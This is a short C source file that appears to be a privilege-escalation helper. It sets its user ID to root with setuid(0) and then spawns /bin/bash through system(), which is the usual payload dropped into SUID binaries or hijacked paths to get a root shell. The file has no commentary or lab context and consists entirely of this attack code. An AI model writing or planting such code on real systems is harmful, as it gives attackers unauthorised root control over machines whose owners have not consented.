#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
int main()
{
	setuid(0);
	system("/bin/bash");
}